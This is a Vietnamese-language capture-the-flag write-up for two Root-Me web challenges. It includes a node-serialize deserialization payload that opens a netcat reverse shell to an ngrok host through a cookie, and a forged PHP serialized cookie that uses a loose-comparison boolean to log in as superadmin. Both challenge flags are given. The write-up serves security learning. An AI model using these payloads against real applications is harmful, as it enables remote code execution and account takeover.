# Node - Serialize

- Link Challenge: http://challenge01.root-me.org:59067/

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/a5eeb11d-8eec-4439-ab55-307ac0cd3227)

- Vừa vào thì mình nhận được một trang login.
- Dùng Burp Suite kiểm tra resquest thì mình nhận thấy rằng server sẽ response về cho mình một Cookies có giá trị là ``profile`` và redirect mình về lại ``\``

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/a230517e-3f6f-4e1c-bf06-474d4fcfdda4)

- Tiếp tục xem resquest tiếp theo thì lúc này server đã tự gửi một GET resqeust với Cookies là giá trị đã set cho mình lúc nãy.

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/17f08edd-18ae-4733-999b-2b65502298f7)

- Có vẻ như cookies đã bị serialize và theo tên bài thì trang web này được code bằng Node.

 ![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/b8e02089-55fb-4727-9737-0428dc56be83)

- Sau một hồi research mình tìm được một bài viết khá hay về [Node.js Deserialization Attack ](https://exploit-notes.hdks.org/exploit/web/security-risk/nodejs-deserialization-attack/)
- Dựa theo blog, bây giờ mình tiến hành dựng một port tcp bằng ngrok.

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/2355dfa4-00a1-46cb-a12f-02e492186dac)

- Đoạn code generartor payload sẽ có dạng như sau:

```  nodejs
let y = {
    rce: function () {
        require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 12502 >/tmp/f', function (error, stdout, stderr) { console.log(stdout); });
    },
};

let serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/5e173b84-8940-4cd3-b080-b68ab9bf0a07)

- Bây giờ mình sẽ tiến hành chèn thêm đoạn payload này vào cookies để có thể reverse shell

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/d675eb43-7110-4f38-85f2-8fbe2458cc8c)

- Sau khi có shell, mình chỉ cần lấy flag.

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/938e0984-1651-457e-ba0c-566d64a454d8)

- Flag: ```Y3pS3r0d3c0mp4nY1sB4d!```
# PHP - Serialization
- Link challenge: http://challenge01.root-me.org/web-serveur/ch28/

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/c708670a-88dc-4b09-91e5-eff5b61b64f8)

- Chúng ta có được một form login và một source code.

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/f763dd21-a3e8-4042-9782-65c3a6d3e64a)

- Để ý src, thì mình phát hiện được 1 điều kiện khi login đó là autologin bằng cookies.
- Khi người dùng tick vào ô autologin lúc gửi Request, thì server sẽ tự serialize data và gán nó vào trong cookies.
- Điểm đáng chú ý của hàm này đó là mỗi khi server unserialize cookies thì không có bước verify xem cookies có bị thay đổi hay không.

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/c388f88b-b3b6-48ae-b220-eaf4f449ab4a)

- Và điều kiện để chúng ta có được flag là login vào được với quyền của superadmin.
- Ý tưởng của mình là chỉ cần login vào với tài khoản ```guest\guest``` để có được cookie của autologin và chỉnh sửa nó để bypass bước xác thực của server.

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/d32a4ee6-6704-4fad-afe1-c1d2c5236c61)

- Cookies chứa giá trị của autologin có dạng như sau.

```a:2:{s:5:"login";s:5:"guest";s:8:"password";s:64:"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec";}```

- Việc của mình bây giờ chỉ cần thay đổi nó thành ```superadmin``` và password là ```b:1``` ( bởi gì server kiểm tra password toán tử == ).

```a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}```

- Khi login bằng cookies của superadmin thì chúng ta đã có flag.

![image](https://github.com/TooBunReal/rootme-writeup/assets/89735990/af93d14a-f267-4fb7-99e3-b1665fbdc58d)

- Flag: ```NoUserInputInPHPSerialization!```
